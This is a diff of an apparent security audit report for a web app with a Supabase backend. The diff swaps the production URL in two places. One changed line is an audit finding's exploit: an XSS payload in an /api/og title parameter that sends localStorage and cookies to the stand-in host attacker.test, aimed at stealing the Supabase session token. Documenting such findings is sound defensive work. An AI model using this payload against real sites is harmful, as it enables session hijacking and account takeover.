@@ -3,7 +3,7 @@
 **Audit date:** 2026-05-05
 **Auditor scope:** Senior security, architecture, DevOps, QA, performance, privacy, mobile/web release
 **Repo head audited:** `921c445` on `main` (HEAD before this report)
-**Production URL:** https://mishwar-nu.vercel.app
+**Production URL:** https://www.mishwaro.com
 **Backend:** Supabase project `dimtdwahtwaslmnuakij`
 **Audit method:** Static analysis of repo; SQL/RLS review; cross-reference with handoff brief and live RLS state described therein. No runtime penetration testing performed.
 
@@ -158,7 +158,7 @@ if (description) {
 
 **Exploit:**
 ```
-https://mishwar-nu.vercel.app/api/og?title=</title><script>fetch('//attacker.test/x',{method:'POST',body:JSON.stringify({s:localStorage,c:document.cookie})})</script><title>x
+https://www.mishwaro.com/api/og?title=</title><script>fetch('//attacker.test/x',{method:'POST',body:JSON.stringify({s:localStorage,c:document.cookie})})</script><title>x
 ```
 
 When the victim clicks, the attacker exfiltrates the Supabase session token (key `sb-dimtdwahtwaslmnuakij-auth-token` in localStorage) and any cookies. With the access token they can act as the victim against the Supabase REST API for the lifetime of the JWT (typically 1 hour, refreshable).
